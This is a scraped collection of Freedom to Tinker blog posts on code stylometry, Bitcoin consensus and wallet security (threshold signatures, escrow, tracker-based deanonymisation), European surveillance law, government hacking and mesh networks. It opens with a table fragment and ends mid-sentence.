Accuracy achieved Type of classification task Ghostwriting 95% Comparison of 250 programmers Copyright investigation 99% Comparison of two programmers Authorship verification 93% Comparison of one programmer to random/unknown programmer Identifying intruders/malware authors Future work Does the source code belong to a programmer in the training set? If so, which one? I am grateful for Arvind Narayanan’s useful feedback on this blog post."
"229","2015-01-21","2023-03-24","https://freedom-to-tinker.com/2015/01/21/anonymous-programmers-can-be-identified-by-analyzing-coding-style/","Every programmer learns to code in a unique way which results in distinguishing “fingerprints” in coding style. These fingerprints can be used to compare the source code of known programmers with an anonymous piece of source code to find out which one of the known programmers authored the anonymous code. This method can aid in finding malware programmers or detecting cases of plagiarism. In a recent paper, we studied this question, which we call source-code authorship attribution. We introduced a principled method with a robust feature set and achieved a breakthrough in accuracy. Our results. We used a dataset with 250 programmers that had an average of 630 lines of code per programmer. We used a combination of lexical features (e.g., variable name choices), layout features (e.g., spacing), and syntactic features (i.e., grammatical structure of source code), resulting in a 95% accuracy at attributing an anonymous piece of code to one of 250 programmers. This is significantly better than prior work because of the larger number of candidate programmers and greater accuracy. The largest dataset used in previous work, in terms of number of programmers, had 46 programmers (they don’t state the number of lines of code). The accuracy was 55%. In another study, with a smaller dataset of 30 programmers and an average of 1,910 lines of code per programmer, 97% accuracy was reached. Dataset. Google Code Jam is an annual international programming competition. It has thousands of participants from different backgrounds such as professional programmers, students, and hobbyists. The solution files of the programming tasks submitted by the contestants have been published on the website since 2008. We collected the C++ source code of more than 100,000 contestants along with their usernames from 2008 to 2014. We wanted to avoid risk of identifying the specific properties of problems’ possible solutions instead of a programmer’s coding style. Fortunately, in Google Code Jam, contestants try to solve the same sequence of problems to advance to more difficult rounds. This allowed us to construct experimental datasets in such a way that the training sets for each of 250 programmers were solutions to the same task. The test set was a source code file not seen in any of the training sets. Abstract syntax trees. Our work is an application of machine learning. Broadly, there are two steps: turning each input file into a vector of numerical features, followed by using a classifier that learns the patterns in each programmer’s feature vectors to classify a new, previously unseen vector. The key advance in our work is the use of a deeper set of structural features to represent coding style. In particular, we used syntactic features extracted from “abstract syntax trees” along with lexical and layout features directly extracted from source code. Abstract syntax trees in source code are analogous “parse trees” of prose sentences. Prose authorship attribution that utilizes parse trees have been able to identify an anonymous text from 100,000 candidate authors 20% of the time. The figures below show a code snippet and the corresponding abstract syntax tree. Source Code Corresponding Abstract Syntax Tree What’s next. Despite the leap in source code authorship attribution accuracy, we believe that this is only a first step in code stylometry and this line of attack will yield many improvements. Just as linguistic stylometry has seen huge leaps in the last few years, a rigorous machine learning based approach can transform code stylometry. For example, adding control flow graph features could further boost accuracy. Code stylometry has applications in security, privacy, software forensics, and software engineering. In a follow-up blog post, I’ll discuss how it can be used for various problems in different areas. The results I presented above pertain to the general case of a “closed world setting” with multiple programmers. I will conclude with one practical example of where this can be useful. If we have a set of programmers who we think might be Satoshi, and samples of source code from each of these programmers, we could use the initial versions of Bitcoin’s source code to try to determine Satoshi’s identity. Of course, this assumes that Satoshi didn’t make any attempt to obfuscate his or her coding style."
"230","2014-12-26","2023-03-24","https://freedom-to-tinker.com/2014/12/26/consensus-in-bitcoin-one-system-many-models/","At a technical level, the Bitcoin protocol is a clever solution to the consensus problem in computer science. The idea of consensus is very general — a number of participants together execute a computation to come to agreement about the state of the world, or a subset of it that they’re interested in. Because of this generality, there are different methods for analyzing and proving things about such consensus protocols, coming from different areas of applied math and computer science. These methods use different languages and terminology and embody different assumptions and views. As a result, they’re not always consistent with each other. This is a recipe for confusion; often people disagree because they’ve implicitly assumed one world-view or another. In this post I’ll explain the two main sets of models that are used to analyze the security of consensus in Bitcoin. The traditional application of consensus is to distributed databases. A good example is a data center with numerous nodes that all operate on the same data. The system must defend against failures of its components, but failures of a relatively benign kind — nodes may crash, or at worst, behave randomly. As malware and attacks over the Internet became more common, distributed consensus researchers also studied Byzantine faults where nodes may be taken over by an adversary and may behave in an arbitrary way. In this field of research the usual goal is to prove that consensus is or isn’t possible in various scenarios. Some percentage of nodes are assumed to be “honest,” which means that they always follow a specified protocol, and others are “malicious,” which means that they may deliberately try to subvert the protocol. When Bitcoin came along, people looked for models to analyze its behavior, and the Byzantine consensus model looked like a decent fit, provided we make some tweaks. In particular, in Bitcoin when we talk about fractions of nodes we must weight them by hash power. This is the model that the original paper uses to analyze security, as well as several follow-up works. But notice how different Bitcoin is from the traditional applications that the model is meant for. In a distributed system it’s a good bet that a system administrator will notice that something is wrong before too many nodes get compromised, and fix them, so it makes sense to assume that some fraction of nodes are always honest. But what compels any Bitcoin node or miner to follow the protocol? In fact, miners have powerful monetary incentives, and one argument is that they’ll try and maximize their profits, regardless of whether or not that means following the protocol. The branch of math that studies the behavior of interacting participants who follow their incentives is called game theory. This is the other main set of models that’s been applied to Bitcoin. In this view, we don’t classify nodes as honest and malicious. Instead, we assume that each node picks a (randomized) strategy to maximize its payoff, taking into account other nodes’ potential strategies. If the protocol and incentives are designed well, then most nodes will follow the rules most of the time. “Honest” behavior is just one strategy of many, and we attach no particular moral salience to it. This model has a certain elegance to it, and avoids assumptions that look arbitrary and are hard to justify, such as 50% of nodes being honest. In practice there is some diversity of client implementations, and the protocol evolves over time, so even to designate some behavior as honest is somewhat arbitrary. But elegance of the theory is not enough. Can we effectively model the system with all its interacting components in the language of strategies and payoff-maximization? Is the resulting model tractable — can we analyze it mathematically or using simulations? And most importantly, do its predictions match what we observe in practice? I’ll discuss these questions in a follow-up post."
"231","2014-01-29","2023-03-24","https://freedom-to-tinker.com/2014/01/29/echr-fast-tracks-court-case-on-prism-and-tempora-and-very-angry-birds/","So. The NSA and GCHQ piggyback on Angry Birds to spy on its 1.7 billion users. potential terrorists. Not only that, but everything on smartphones can be compromised: “if its on the phone, we can get it”. Will it ever stop? A few days ago, the European Court of Human Rights (‘ECHR’) made the unique move to fast-track a case on the legality of mass surveillance practices by the GCHQ. A judgement is now expected in months, rather than years – in time to have a huge impact on the global debate on mass surveillance. Time for some analysis. In September 2013 ‘Privacy not PRISM’, a group of NGOs and activists, challenged the UK government’s surveillance directly with the ECHR. Last week, the ECHR wrote to the group [pdf] that it gives the case priority – which it hardly ever does. Then again, the practices attack the core of the right to privacy. 2 May 2014 is the deadline for the UK government to provide information to the ECHR on three essential questions. The letter also reveals some interesting details on how the ECHR will approach the third, critical question. Firstly, “can the applicants claim that their privacy rights have been violated?” This seems a no-brainer. As I blogged before, in contrast with the U.S. Supreme Court’s stance on ‘actual harm’ in Clapper v. Amnesty, the ECHR accepts the ‘mere existence’ of vague surveillance law and practices as a sufficient basis for applicants. Secondly, have the ‘domestic means been exhausted’? The UK government told the group to file their case with the “Investigatory Powers Tribunal” of the executive branch. Not so smart: in 2010, Kennedy v. The UK, the ECHR ruled that this UK Tribunal does not provide an effective judicial remedy for privacy victims. While the UK government will try everything in its power to let the case proceed on a national level, it would be suprising if the ECHR allows that to happen. The third question is the most relevant. Actually, three sub-questions need to be separated. Are PRISM and TEMPORA i) ‘in accordance with the law’?; ii) ‘necessary in a democratic society?’ and, what the ECHR did not ask the UK government, iii) what about all those other revelations? The ECHR has ruled on a similar case in 2008; Liberty a.o. v. The UK, discussed here. The key outcome was that the mass surveillance under scrutiny wasn’t even known and regulated, so the ECHR could not even assess whether its procedural criteria had been met. The resulting potential for arbitrariness and misuse are inherently not ‘in accordance with the law’. Violation, full stop. So in Liberty, the ECHR could conveniently stop at that, before it would have to tackle the next, more controversial question. Are PRISM and TEMPORA ‘necessary in a democratic society?’ Although the ECHR could avoid this question before, it will probably have to assess it this time around. Interestingly, it pointed at three prior cases. The Liberty case, but also Weber and Saravia v. Germany and Iordachi a.o. v. Moldovia. Even though the ECHR grants a wide ‘margin of appreciation’ to states for their national security policies, it has ruled countless times that states cannot destroy democracy on grounds of defending national security. And that violations should be an exception, not the rule. I have a hard time seeing how mass taps on sea cables in the TEMPORA program can be justified. There’s a lot more to say, so I will go into more details in a separate post. Especially, a critical issue will be whether the ECHR decides that the 47 countries of the Council of Europe have a duty to protect their citizens against NSA surveillance – or any other foreign intel agency for that matter – of privately-owned communications networks like sea cables and telco wires within a country. Finally, what about all those new revelations? This boils down to how the ECHR operates. The ECHR – not the European Union Court – rules about specific facts brought before it. Dr. Ian Brown has done a terrific job describing [pdf] the technical details and implications of PRISM and TEMPORA as an expert witness in this case. Of course, countless revelations have been added to the mix; especially the revelations about the NSA and GCHQ subverting and hacking into technologies and 100.000 boxes around the world: BULLRUN, QUANTUM and of course VERYANGRYBIRDS – total smartphone hacking. Those newer developments might not be addressed in this case, but other cases have been launched and will in the end reach the ECHR. Maybe not in months, but indeed in years. The ECHR clearly sees the ‘Privacy not PRISM’ case as a priority. This is a boost for Europeans seeking to end mass surveillance via courts, rather than through the political process. And it will stimulate journalists working on these issues to continue revealing mass surveillance practices. So yes, regardless of what some pundits may claim, it does matter what the NSA – and GCHQ for that matter – are doing. Eventually, VERYANGRYBIRDS will drop their bombs."
"232","2014-02-20","2023-03-24","https://freedom-to-tinker.com/2014/02/20/9-problems-of-governments-hacking-why-it-systems-deserve-constitutional-protection/","Governments around the world are increasingly hacking into IT-systems. But for every apparent benefit, government hacking creates deeper problems. Time to unpack 9 of them, and to discuss one unique perspective: in response to a proposed hacking law in 2008, the German Constitutional Court created a new human right protecting the ‘confidentiality and integrity of IT-systems’. The rest of the world should follow suit, and outlaw government hacking until its deep problems are addressed. The NSA has been hacking for a while now, but the FBI, state and even local authorities also seem to be hacking at will without public accountability. Yale ISP and Chris Soghoian put together a great conference on Law Enforcement Hacking to start the discussion (video online soon). Probably because of its constitutional DNA, some law enforcement agencies in Europe have felt obliged to provide some details to the public. So in my short talk [slides pdf] I could discuss the 2010 Bredolab botnet case, as well as the 2008 German Constitutional Court ‘Bundestrojaner’ ruling (English summary, excellent case note). In the landmark ‘Federal Trojan’ case, the German court established a constitutional right the ‘confidentiality and integrity of IT-systems’ (recognize the c.i.a.-triad?). It held that IT-systems are a qualitatively unique space with regard to surveillance, and that government hacking is a stepping stone into further violations. IT-systems contain our most intimate and sensitive data – ‘the core of personality’ that is inviolate under art. 1 of its Constitution. As devices are increasingly networked, a successful hack also gives insight into the lives of people you interact with. Furthermore, devices might become a one stop-shop for law enforcement as we concentrate and even structure our lives on our devices or in the cloud. The Court also reflected on the internet of things: if your future fridge has ‘general purpose’ functionality such as storage, it may fall within the new constitutional right in Germany. The Court left a possibility open for future hacking laws, but only if such laws meet the strictest legal criteria the Court set to date. Much stricter than placing a wiretap, or searching a house. Its rulings have had global impact before. In 1983, the German election census case created a new constitutional right to ‘informational self-determination’, providing a solid constitutional basis in Europe for data protection and the concept of consent. Interestingly, the European Court of Human Rights case-law is slowly but surely moving forward: I v. Finland (2008, para. 37-39) establishes positive obligations to ensure data security through specific legislation, and the Bernh Larsen v. Norway case (2013, para. 106) rules that ‘all data on a server’ deserves protection, not ‘only’ personal data. The fast-tracked and pending post-Snowden case may push it further. Constitutional protection provides the normative baseline to evaluate government surveillance law. And to condemn actual practices. The Chaos Computer Club discovered a few years after the ‘Bundestrojaner’ (love that term) ruling that German authorities continued to spread malware anyway. It got hold of a Bundestrojan and reverse-engineered it (recommended read). With the Dutch bredolab case and the comments made by the panel at the conference, a fascinating problem set emerges: Judicial oversight: judges face a hard or impossible task assessing the admissibility of government hacking warrant. The hacking tools and payload of government malware are either lied about (as in Germany), sealed in court documentation, or obscured in newspeak: ‘network investigation tool’ or any other of over 20 synonyms. Insecure malware: the reverse engineered German malware was of so deplorable state, that it in facr facilitated man in the middle attacks on suspect and even law enforcement IT-systems. The commends to the trojan were unencrypted. All serious problems in themselves, also creating evidence issues in trial. A suspect may be able to claim someone else has placed code or data on its device. Bad incentives: governments get an incentive to weaken information security. Bits of Freedom launched a campaign on the role of antivirus companies, which many co-signed, asking whether they will let badly crafted government malware through. FinFisher and FinSpy are existing, deeply troubling commercial hacking toolkit governments can get installed at ISPs. And at the conference we discussed OS software updates as an attack vector for governments. Will Microsoft, Apple or Google be forced to comply with government requests to provide backdoored updates to specific targets? Parallel Construction: a major issue. This occurs when, say, the NSA hacks into a target, tips a law enforcement agency, which re-creates the same evidence from a different source. At a CITP reading group, we discussed whether this had actually happened in the Silkroad/DPR case. Jurisdiction: when can a law enforcement agency act? What determines a sovereign territory? ‘Citizenship’, ‘ip-address block’, or can governments hack across borders? Dutch authorities used the Bredolab botnet to hack into and remotely install a unverifiable .executable at thousands of infected machines across the internet. Constitutional scope: if I VPN my connection to Amsterdam, even though I’m physically based in the U.S., do I lose my reasonable expectation to 4th amendment protection that I would have if the government would raid my U.S. apartment? Geopolitics: what about the geopolitical Pandora’s box? if you happen to hack into a foreign government system, what about reciprocity, or retaliation? No reliable data: We don’t have reliable data about the size of the problem. Not aggregate, not in individual cases. Threats are systematically inflated, the size of the Bredolab botnet easily by an order of magnitude. Necessity: is government malware, or hacking even necessary? Many well-respected technologists frame the debate as “either mass surveillance, or targeted hacking”. While I agree that mass surveillance and weakening of infrastructure is even more problematic, I think that frame is incorrect in this golden age of surveillance. Less problematic alternatives will exist: the recent takedown of Utopia, a TOR hidden service widely regarded as a Silk Road heir, employed intrusive but well-established undercover techniques. The list doesn’t end here. The cynic and realist would say, “it’s happening anyway so why bother?” The simple answer is: government hacking is different than a wiretap, so needs a specific policy response. Until aforementioned problems are addressed and legal safeguards are in place, judges should push back and government hacking should be considered what it currently is: illegal."
"233","2014-03-28","2023-03-24","https://freedom-to-tinker.com/2014/03/28/new-research-better-wallet-security-for-bitcoin/","[UPDATE (April 3, 2014): We’ve found an error in our paper. In the threshold signature scheme that we used, there are restrictions on the threshold value. In particular if the key is shared over a degree t polynomial, then 2t+1 players (not t+1) are required to to construct a signature. We thought that this could be reduced to t+1, but our technique was flawed. We are exploring various modifications, and we will post further details when we have an update.] The Bitcoin ecosystem has been plagued by thefts and losses that have affected both businesses and individuals. The security of a Bitcoin wallet rests entirely on the security of its associated private keys which can digitally sign transactions to irreversibly spend the coins in the wallet. In a new paper, we show how to use the cryptographic technique of threshold signatures to increase the security of both corporate and individual wallets. Perhaps Bitcoin’s toughest security challenge is protecting Internet-connected wallets from insider threats. Such hot wallets cannot be kept in highly secure, offline cold storage. One good way for businesses to mitigate this vulnerability is to have hot wallets jointly controlled by multiple parties. This way, no party can independently steal corporate funds. In our paper, we show how to achieve joint control of wallets using threshold signatures. The problem of implementing joint control is more important and more difficult for a Bitcoin wallet than it is for a traditional bank account. Whereas regular bank transactions have recovery mechanisms if fraud is detected, Bitcoin transactions are irreversible and their pseudonymity makes it difficult to identify thieves and attempt to recover stolen funds. Moreover, while large bank transactions typically require human action to complete, Bitcoin transactions–no matter how large–require only a cryptographic signature to authorize. The threshold signature approach to joint control works like this: the private key controlling the wallet is split between devices belonging to n different participants such that any m of them can jointly produce a digital signature, while a group of less than m participants cannot. Crucially, in the process of producing a signature, the key is never reconstructed. As long as an attacker has compromised fewer than m devices, the key remains secure. Our method for achieving joint control has significant benefits over Bitcoin’s “multi-signature” transactions. With multi-signatures, each party’s signature is published to the block chain, whereas threshold signatures allow participants to privately create a single signature which is indistinguishable from ordinary Bitcoin signatures. You can think of our solution as “stealth multi-signatures.” This improves anonymity and confidentiality while keeping transactions a constant size, reducing fees and providing flexibility to scale to an arbitrary number of parties. We implemented a threshold signature protocol and have used it to demonstrate joint control over a Bitcoin wallet. We produced this transaction using a 9-of-12 threshold signature. If you click on the link to see the transaction details, you won’t see anything special; it looks like any regular transaction. That’s exactly the point! Joint control is one of several security measures that can be built using threshold signatures. In our paper, we show that threshold signatures can be used as a primitive to build schemes for secure bookkeeping and secure delegation. One application that we’re particularly excited about is using threshold signatures to achieve two-factor security for personal wallets. In a follow-up post, we will elaborate on this application and discuss our ongoing efforts to build a two-factor secure wallet. The main lesson from our work is that a spectrum of traditional internal financial controls can be translated to the Bitcoin world by novel application of cryptography. We hope that the security measures we’ve proposed will become standard in Bitcoin usage, and we are looking forward to working with developers and others who want to adopt our solutions. We’d like to thank Greg Maxwell and Andrew Miller for providing useful feedback."
"234","2017-08-17","2023-03-24","https://freedom-to-tinker.com/2017/08/17/when-the-cookie-meets-the-blockchain/","Cryptocurrencies are portrayed as a more anonymous and less traceable method of payment than credit cards. So if you shop online and pay with Bitcoin or another cryptocurrency, how much privacy do you have? In a new paper, we show just how little. Websites including shopping sites typically have dozens of third-party trackers per site. These third parties track sensitive details of payment flows, such as the items you add to your shopping cart, and their prices, regardless of how you choose to pay. Crucially, we find that many shopping sites leak enough information about your purchase to trackers that they can link it uniquely to the payment transaction on the blockchain. From there, there are well-known ways to further link that transaction to the rest of your Bitcoin wallet addresses. You can protect yourself by using browser extensions such as Adblock Plus and uBlock Origin, and by using Bitcoin anonymity techniques like CoinJoin. These measures help, but we find that linkages are still possible. An illustration of the full scope of our attack. Consider three websites that happen to have the same embedded tracker. Alice makes purchases and pays with Bitcoin on the first two sites, and logs in on the third. Merchant A leaks a QR code of the transaction’s Bitcoin address to the tracker, merchant B leaks a purchase amount, and merchant C leaks Alice’s PII. Such leaks are commonplace today, and usually intentional. The tracker links these three purchases based on Alice’s browser cookie. Further, the tracker obtains enough information to uniquely (or near-uniquely) identify coins on the Bitcoin blockchain that correspond to the two purchases. However, Alice took the precaution of putting her bitcoins through CoinJoin before making purchases. Thus, either transaction individually could not have been traced back to Alice’s wallet, but there is only one wallet that participated in both CoinJoins, and is hence revealed to be Alice’s. Using the privacy measurement tool OpenWPM, we analyzed 130 e-commerce sites that accept Bitcoin payments, and found that 53 of these sites leak transaction details to trackers. Many, but not all, of these leaks are by design, to enable advertising and analytics. Further, 49 sites leak personal identifiers to trackers: names, emails, usernames, and so on. This combination means that trackers can link real-world identities to Bitcoin addresses. To be clear, all of this leaked data is sitting in the logs of dozens of tracking companies, and the linkages can be done retroactively using past purchase data. On a subset of these sites, we made real purchases using bitcoins that we first “mixed” using the CoinJoin anonymity technique.[1] We found that a tracker that observed two of our purchases — a common occurrence — would be able to identify our Bitcoin wallet 80% of the time. In our paper, we present the full details of our attack as well as a thorough analysis of its effectiveness. Our findings are a reminder that systems without provable privacy properties may have unexpected information leaks and lurking privacy breaches. When multiple such systems interact, the leaks can be even more subtle. Anonymity in cryptocurrencies seems especially tricky, because it inherits the worst of both data anonymization (sensitive data must be publicly and permanently stored on the blockchain) and anonymous communication (privacy depends on subtle interactions arising from the behavior of users and applications). [1] In this experiment we used 1–2 rounds of mixing. We provide evidence in the paper that while a higher mixing depth decreases the effectiveness of the attack, it doesn’t defeat it. There’s room for a more careful study of the tradeoffs here."
"235","2017-03-22","2023-03-24","https://freedom-to-tinker.com/2017/03/22/how-to-buy-physical-goods-using-bitcoin-with-improved-security-and-privacy/","Bitcoin has found success as a decentralized digital currency, but it is only one step toward decentralized digital commerce. Indeed, creating decentralized marketplaces and mechanisms is a nascent and active area of research. In a new paper, we present escrow protocols for cryptocurrencies that bring us closer to decentralized commerce. In any online sale of physical goods, there is a circular dependency: the buyer only wants to pay once he receives his goods, but the seller only wants to ship them once she’s received payment. This is a problem regardless of whether one pays with bitcoins or with dollars, and the usual solution is to utilize a trusted third party. Credit card companies play this role, as do platforms such as Amazon and eBay. Crucially, the third party must be able to mediate in case of a dispute and determine whether the seller gets paid or the buyer receives a refund. A key requirement for successful decentralized marketplaces is to weaken the role of such intermediaries, both because they are natural points of centralization and because unregulated intermediaries have tended to prove untrustworthy. In the infamous Silk Road marketplace, buyers would send payment to Silk Road, which would hold it in escrow. Note that escrow is necessary because it is not possible to reverse cryptocurrency transactions, unlike credit card payments. If all went well, Silk Road would forward the money to the seller; otherwise, it would mediate the dispute. Time and time again, the operators of these marketplaces have absconded with the funds in escrow, underscoring that this isn’t a secure model. Lately, there have been various services that offer a more secure version of escrow payment. Using 2-of-3 multisignature transactions, the buyer, seller, and a trusted third party each hold one key. The buyer pays into a multisignature address that requires that any two of these three keys sign in order for the money to be spent. If the buyer and seller are in agreement, they can jointly issue payment. If there’s a dispute, the third party mediates. The third party and the winner of the dispute will then use their respective keys to issue a payout transaction to the winner. This escrow protocol has two nice features. First, if there’s no dispute, the buyer and seller can settle without involving the third party. Second, the third party cannot run away with the money as it only holds one key, while two are necessary spend the escrowed funds. Until now, the escrow conversation has generally stopped here. But in our paper we ask several further important questions. To start, there are privacy concerns. Unless the escrow protocol is carefully designed, anyone observing the blockchain might be able to spot escrow transactions. They might even be able to tell which transactions were disputed, and connect those to specific buyers and sellers. In a previous paper, we showed that using multisignatures to split control over a wallet leads to major privacy leaks, and we advocated using threshold signatures instead of multisignatures. It turns out that using multisignatures for escrow has similar negative privacy implications. While using 2-of-3 threshold signatures instead of multisignatures would solve the privacy problem, it would introduce other undesirable features in the context of escrow as we explain in the paper. Moreover, the naive escrow protocol above has a gaping security flaw: even though the third party cannot steal the money, it can refuse to mediate any disputes and thus keep the money locked up. In addition to these privacy and security requirements, we study group escrow. In such a system, the transacting parties may choose multiple third parties from among a set of escrow service providers and have them mediate disputes by majority vote. Again, we analyze both the privacy and the security of the resulting schemes, as well as the details of group formation and communication. Our goal in this paper is not to provide a definitive set of requirements for escrow services. We spoke with many Bitcoin escrow companies in the course of our research — it’s a surprisingly active space — and realized that there is no single set of properties that works for every use-case. For example, we’ve looked at privacy as a desirable property so far, but buyers may instead want to be able to examine the blockchain and identify how often a given seller was involved in disputes. In our paper, we present a toolbox of escrow protocols as well as a framework for evaluating them, so that anyone can choose the protocol that best fits their needs and be fully aware of the security and privacy implications of that choice. We’ll present the paper at the Financial Cryptography conference in two weeks."
"236","2014-04-22","2023-03-24","https://freedom-to-tinker.com/2014/04/22/mesh-networks-wont-fix-internet-security/","There’s no doubt that the quality of tech reporting in major newspapers has improved in recent years. It’s rare these days to see a story in, say, the New York Times whose fundamental technical premise is wrong. Still, it does happen occasionally—as it did yesterday. Yesterday’s Times ran a story gushing about mesh networks as an antidote to Internet surveillance. There’s only one problem: mesh networks don’t do much to protect you from surveillance. They’re useful, but not for that purpose. A mesh network is constructed from a bunch of nodes that connect to each other opportunistically and figure out how to forward packets of data among themselves. This is in constrast to the hub-and-spoke model common on most networks. The big advantage of mesh networks is availability: set up nodes wherever you can, and they’ll find other nearby nodes and self-organize to route data. It’s not always the most efficient way to move data, but it is resilient and can provide working connectivity in difficult places and conditions. This alone makes mesh networks worth pursing. But what mesh networks don’t do is protect your privacy. As soon as an adversary connects to your network, or your network links up to the Internet, you’re dealing with the same security and privacy problems you would have had with an ordinary connection. To its credit, the project being hyped in the Times, called Commotion, doesn’t seem to be making inflated security claims. Commotion’s own site says that it “can not hide your identity”, “does not prevent monitoring of internet traffic”, and “does not provide strong security against monitoring over the mesh”. The Times article follows a pattern common in overhyped security stories: it talks about a security problem, points to an exciting new technology, and offers quotes about how useful it would be to solve the security problem. What it doesn’t do is explain how the exciting new technology actually solves the security problem. And the quotes, unsurprisingly, are not from security experts. Our government has apparently spent millions on the development of Commotion. That may be justified, given that the availability and resilience of mesh networks do help to foster freedom of expression by making it harder for governments to cut off their citizens from independent information sources. But if government wants to invest in security for Internet users in challenging places, it would be better off putting the money elsewhere. To give just one example, the money spent on mesh networks could probably have paid for security audits for OpenSSL and other critical components that hundreds of millions of people around the world rely on every day."
"237","2014-05-23","2023-03-24","https://freedom-to-tinker.com/2014/05/23/threshold-signatures-and-bitcoin-wallet-security-a-menu-of-options/","Before Bitcoin can mature as a currency, the security of wallets must be improved. Previously, I motivated the need for sharing Bitcoin wallets using threshold signatures as a means to greatly increase their resilience to theft. For corporate users, threshold signatures enable cryptographically secure access control. For individuals, threshold signatures can be used to build two-factor secure wallets. Our work was predicated on the assumption that there exist threshold signature schemes that are compatible with Bitcoin. Indeed, there are various threshold signature schemes that meet this requirement. But it turns out that there are a number of desirable properties of such schemes, and each alternative satisfies some subset of them. In this technical post, I’ll examine the desirable properties and how each available solution fares. While no scheme is suited to all possible applications, it appears that almost every use case can be satisfied by one of the schemes I describe. Bitcoin uses ECDSA signatures to validate transactions. Aside from the private key, x, every ECDSA signature has an associated nonce, k. Computing the signature requires knowledge of the x, k, as well as k-1, the modular multiplicative inverse of k. It is imperative that the signer does not reveal k or k-1, as knowledge of either of these together with the signature in which k is used allows one to derive the private key. It is similarly crucial that a new nonce is chosen for each signature as one can learn the private key from two signatures that share a nonce. For the threshold version of ECDSA, we must ensure then that k is not known to any of the signing parties. As knowledge of k implies knowledge of the private key, we must apply the same secret sharing techniques to k and k-1as we do to the private key itself. Moreover, the requirement that a nonce must not be reused means that for each signature, participants will have to obtain shares of a fresh k as well as shares of k-1. Generating ECDSA signatures in a threshold manner has two difficulties. Firstly, as a new k is needed for each signature, we would ideally want participants to be able to generate shares of k themselves without a dealer. While generating shares of a random nonce is not very difficult, recall that parties must also obtain shares of k-1, the nonce’s modular multiplicative inverse, and this of course must be done without reconstructing k. Obtaining shares of both k and k-1 without a trusted dealer is one of the central difficulties in generating ECDSA signatures in a threshold manner. The second difficulty for creating a threshold version of ECDSA is that generating the signature requires obtaining shares of k-1·x, the product of two secret shared values. These difficulties are not unique to ECDSA; they apply to generic DSA over any other group, such as a multiplicative group of integers mod p as used in traditional DSA (DSS). While the literature is rather sparse on the topic of ECDSA signatures, it is quite rich on DSA, and most of the techniques presented can be modified to work for ECDSA as well. Today, I will discuss four such proposals and discuss the drawbacks of each one. It is important to put the ensuing discussion into the proper context. ECDSA, the digital signature scheme used in Bitcoin, comes from the DSA family of digital signature schemes for which building threshold signature schemes is difficult. We will discuss various options for threshold ECDSA, and discuss their applicability to Bitcoin. Fundamentally, there is no reason that the Bitcoin protocol cannot also recognize other signature schemes that lend themselves to building more ideal threshold versions. In fact, we plan to introduce a Bitcoin Improvement Proposal (BIP) suggesting that Bitcoin include an option for a more threshold-friendly scheme. Before discussing the four schemes, I will introduce some notation that will ease our analysis. Any threshold signature will have a security parameter t, which is the minimum number of participants that can jointly reconstruct (or even learn any information about) the key. By t’ we will refer to the minimum number of participants required to generate a signature. Clearly t’ will always be at least t, and ideally, we’d like t’ to equal t. We denote by the total number of players (participants) by n. In an ideal scheme, t will be able to assume any positive integer value less than or equal to n. Note that if t’ > t, then this latter property will be impossible to realize as n ≥ t’ > t. The easiest way around the difficulties above is to introduce a trusted dealer. In this scheme, presented by Susan Langford in the context of threshold DSA, the dealer deals to each player shares of k-1, k-1·x, and k·G (this is the only part of the signature that k is used, and it can be precomputed and shared as it does not require knowledge of the message). A trusted dealer will initialize the signers and deal them shares for many k. Once they are dealt these values, the parties can generate signatures in a threshold manner without further help from the dealer. This approach has both pros and cons. The most obvious downside is the requirement of a trusted dealer. In the Bitcoin context, this is sensible when transferring coins from existing non-thresholded address in which some party already knows the entire key and thus can serve as a natural dealer. For organizations which keep funds in cold storage and regularly transfer them to hot storage, the transfer process can include trusted dealing of new shares, protected by a ceremony including physical security measures and HSMs. The major downside of this approach is that participants will not be able to generate a new shared address without a trusted dealer. This means the dealer must deal many values, one for each signature that will be ever be computed. The participants must also ensure that they are synchronized so that the group never signs two messages using the same k. Despite these downsides, this scheme has some properties that make it quite attractive. Most notably, it is non-interactive. Each participant just publishes their partial signature, and anyone with the threshold number of partial signatures can combine them into a valid signature. Additionally, this scheme has the desired properties that t’ = t and that t can take on any positive integer value less than or equal to n. A second scheme, proposed by Gennaro et al., eliminates the need for a trusted dealer. Yet this is accomplished at some cost. Firstly, the scheme is interactive, requiring multiple rounds of exchanged messages among participants. Moreover, t’ = 2t – 1. This has two implications. Firstly, it means that “extra” participants will be required to generate a signature. By “extra” I mean that while we are only achieving security against t malicious participants, we require the active participation of 2t -1 of them in order to generate a signature. Secondly, this means that t ≤ (n + 1) / 2. This scheme will thus be unable to realize a 2-out-of-2 signature. In the Bitcoin context, this means that two-factor security cannot be implemented with this scheme. (The error in the first draft of our paper arose because we didn’t realize that t’ > t in the Gennaro et al. scheme.) While the 2t – 1 requirement is not ideal, it does have some uses. If t is small relative to n, then the 2t – 1 requirement may not be too burdensome. Moreover, consider the case of a company that wants to use this scheme to share spending authority over a corporate wallet. The company can set up t – 1 hardware devices that store key shares and participate in all requests to sign. Now, t employees can jointly generate a signature. Of course, if a single employee manages to compromise all of the hardware devices, they can learn the key. But, together with physical security and tamper resistant hardware, this can be made quite difficult. Alternatively, the 2t – 1 requirement may be acceptable in some cases. Indeed, one major altcoin has already reached out to us requesting assistance implementing this scheme because they believe 2t – 1 is acceptable for their purposes. Mackenzie and Reiter proposed a scheme specifically for the 2-out-of-2 case. While this scheme is interactive, it is ideal in that it requires no trusted parties and allows participants to jointly generate keys. We are in the process of adapting this scheme to ECDSA with the goal of offering strong two-factor security for Bitcoin. For the rest of this post, we will assume that MacKenzie and Reiter can be made compatible with ECDSA. While we have partially verified this and believe it likely to be the case, there is still work to be done before we can claim this with certainty. Lastly, another method is to incorporate generic secure multiparty computation to achieve a threshold signature scheme with ideal properties. For the two party case this will use Yao Garbled Circuits, and similar circuit-based schemes exist for the case when more than two parties are involved. These protocols are all interactive, but more fundamentally, the amount of data that would need to be transferred during this interaction is quite large. We’ve put significant work into writing circuits for the 2-out-of-2 threshold signature, and we will describe this work in detail in our modified paper. At this point, however, we believe that due to the data transfer requirements, the other schemes mentioned are strictly better candidates. In the table below, I summarize the various schemes that I have discussed: interactive trusted dealer trusted combiner limited number of signatures constraints on t (minimum that can reconstruct key) t’(minimum that can generate signature) Langford t-of-n no yes no yes ≤ n t Gennaro et al. (2t -1)-of-n yes no no no ≤ (n + 1) / 2 2t – 1 Gennaro with t-1 hardware devices yes no no no ≤ number of non-hardware-device players t non-hardware together with t-1 hardware MacKenzie and Reiter 2-of-2 yes no no external combiner (one party is designated combiner) no 2 2 Using generic MPC (circuit-based) yes and large amounts of data will need to be transferred no no no ≤ n t In summary, there are good solutions for both corporate wallets and two-factor wallet security for individuals. In the former case, if the “extra participants” requirement is acceptable then the Gennaro et al. 